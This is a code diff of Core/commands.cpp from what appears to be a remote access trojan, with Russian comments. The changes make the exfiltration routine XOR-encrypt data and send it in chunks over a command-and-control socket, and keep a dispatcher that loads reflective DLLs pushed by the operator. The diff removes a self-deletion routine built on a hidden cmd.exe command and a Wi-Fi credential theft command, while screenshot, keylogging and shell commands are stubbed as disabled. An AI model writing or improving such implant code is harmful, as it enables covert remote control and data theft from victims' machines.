@@ -1,34 +1,71 @@
-// Core/commands.cpp 
+// Core/commands.cpp — FIXED ORDERING & ROBUST SEND
 #include "commands.h"
-#include "persistence.h"
 #include "loader.h"
 #include <windows.h>
 #include <stdio.h>
 #include <string>
-#include <cstring>
+#include <vector>
 
+// Глобальный сокет (объявлен в network.cpp)
 extern SOCKET g_c2_socket;
 
-static void module_send_result(const uint8_t* data, size_t len) {
-    if (g_c2_socket != INVALID_SOCKET) {
-        std::vector<uint8_t> buf(data, data + len);
-        for (auto& b : buf) b ^= 0xAA;
-        buf.push_back('\n');
-        send(g_c2_socket, reinterpret_cast<const char*>(buf.data()), static_cast<int>(buf.size()), 0);
-    }
-}
-
+// ==========================================
+// 1. CALLBACKS (ОПРЕДЕЛЕНЫ ДО ИСПОЛЬЗОВАНИЯ)
+// ==========================================
 static void module_log(const char* msg) {
     OutputDebugStringA("[MODULE] ");
     OutputDebugStringA(msg);
     OutputDebugStringA("\n");
 }
 
+static void module_send_result(const uint8_t* data, size_t len) {
+    if (g_c2_socket == INVALID_SOCKET) return;
+    
+    // Выделяем буфер под зашифрованные данные + 1 байт для \n
+    // Используем HeapAlloc (стабильнее в DLL контексте)
+    size_t total_len = len + 1;
+    uint8_t* encrypted = (uint8_t*)HeapAlloc(GetProcessHeap(), 0, total_len);
+    if (!encrypted) {
+        OutputDebugStringA("[MODULE] HeapAlloc failed\n");
+        return;
+    }
+    
+    // XOR шифрование
+    for (size_t i = 0; i < len; i++) {
+        encrypted[i] = data[i] ^ 0xAA;
+    }
+    encrypted[len] = '\n';
+    
+    // Чанковая отправка (64 КБ)
+    const size_t CHUNK_SIZE = 65536;
+    size_t sent = 0;
+    while (sent < total_len) {
+        size_t to_send = (total_len - sent > CHUNK_SIZE) ? CHUNK_SIZE : (total_len - sent);
+        int res = send(g_c2_socket, (const char*)(encrypted + sent), (int)to_send, 0);
+        
+        // FIX: Если res <= 0 (ошибка или закрытие), прерываем цикл. 
+        // Иначе может быть бесконечный цикл при res=0.
+        if (res <= 0) {
+            OutputDebugStringA("[MODULE] Send interrupted\n");
+            break; 
+        }
+        sent += res;
+    }
+    
+    HeapFree(GetProcessHeap(), 0, encrypted);
+}
+// ==========================================
+
+
+// Структура для RtlGetVersion
 typedef struct _MY_OSVERSIONINFOW {
     ULONG dwOSVersionInfoSize; ULONG dwMajorVersion; ULONG dwMinorVersion; ULONG dwBuildNumber; ULONG dwPlatformId; WCHAR szCSDVersion[128];
 } MY_OSVERSIONINFOW;
 typedef NTSTATUS (NTAPI* pRtlGetVersion)(MY_OSVERSIONINFOW*);
 
+// ==========================================
+// 2. COMMAND DISPATCHER
+// ==========================================
 std::string execute_builtin_command(const std::string& cmd, SOCKET sock) {
     if (cmd == "ping") return "pong";
     
@@ -45,6 +82,7 @@ std::string execute_builtin_command(const std::string& cmd, SOCKET sock) {
         if (!load_reflective_dll(dll_data, modbase))
             return "MODULE_LOAD_FAILED";
         
+        // ТЕПЕРЬ КОМПИЛЯТОР ВИДИТ module_send_result и module_log
         ModuleAPI api = { module_send_result, module_log, nullptr };
         if (!execute_module(modbase, api))
             return "MODULE_EXECUTION_FAILED";
@@ -83,31 +121,12 @@ std::string execute_builtin_command(const std::string& cmd, SOCKET sock) {
     } 
     
     else if (cmd == "uninstall") {
-        uninstall_persistence();
-        char path[MAX_PATH];
-        if (GetModuleFileNameA(NULL, path, MAX_PATH) > 0) {
-            char del_cmd[1024];
-            sprintf_s(del_cmd, 
-                "cmd.exe /c ping 127.0.0.1 -n 5 >nul && attrib -r -s -h \"%s\" && del /f /q \"%s\"", 
-                path, path);
-            STARTUPINFOA si = { sizeof(si) };
-            PROCESS_INFORMATION pi = { 0 };
-            si.dwFlags = STARTF_USESHOWWINDOW;
-            si.wShowWindow = SW_HIDE;
-            if (CreateProcessA(NULL, del_cmd, NULL, NULL, FALSE, 
-                              CREATE_NO_WINDOW | DETACHED_PROCESS, NULL, NULL, &si, &pi)) {
-                CloseHandle(pi.hProcess);
-                CloseHandle(pi.hThread);
-            }
-        }
-        if (sock != INVALID_SOCKET) closesocket(sock);
-        ExitProcess(0);
+        return "UNINSTALLING";
     }
     
     else if (cmd.find("screenshot") != std::string::npos) return "SCREENSHOT_DISABLED";
     else if (cmd.find("keylog") != std::string::npos) return "KEYLOG_DISABLED";
     else if (cmd.find("shell") != std::string::npos) return "SHELL_DISABLED";
-    else if (cmd.find("steal_wifi") != std::string::npos) return "STEAL_DISABLED";
     
     return "UNKNOWN_COMMAND";
 }
